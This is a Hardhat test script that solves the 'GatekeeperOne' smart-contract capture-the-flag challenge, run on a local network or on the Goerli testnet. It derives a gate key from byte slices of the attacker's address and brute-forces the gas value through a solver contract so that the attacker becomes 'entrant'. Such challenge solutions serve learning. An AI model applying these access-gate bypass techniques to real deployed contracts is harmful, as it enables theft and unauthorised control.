const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] GatekeeperOne', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('GatekeeperOne');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('GatekeeperOne', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const GatekeeperOneSolverFactory = await ethers.getContractFactory('GatekeeperOneSolver', attacker);
        const GatekeeperOneSolver = await GatekeeperOneSolverFactory.deploy();
        // Calculate gateKey to bypassing gateTwo
        //// Part One
        let partOne = ethers.utils.hexDataSlice(ethers.utils.formatBytes32String(""), 0, 2);
        //// Part Two
        let partTwo = ethers.utils.hexDataSlice(ethers.utils.formatBytes32String("1"), 0, 4);
        //// Part Three
        let partThree = ethers.utils.hexDataSlice(attacker.address, 18, 20);
        // Combine 3 parts
        let gateKey = ethers.utils.hexConcat([partTwo, partOne, partThree]);
        console.log(`\t gateKey: ${gateKey}`);
        let verify = await GatekeeperOneSolver.verifyGateKey(gateKey);
        console.log(`\t verify : ${verify}`);
        // Bruteforce to find the proper number of gas
        for(let i=3020;i<8191;i++){ // 3020 came from local test
            let gas = 30000 + i;
            try{
                let pwnTX = await GatekeeperOneSolver.connect(attacker).pwn(this.target.address, gas, gateKey);
                await pwnTX.wait();
                console.log(`\t gas: ${gas}`);
                break;
            }catch(e){}
        }
        console.log(`\t entrant: ${await this.target.entrant()}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.entrant()).to.be.eq(attacker.address);
    });
});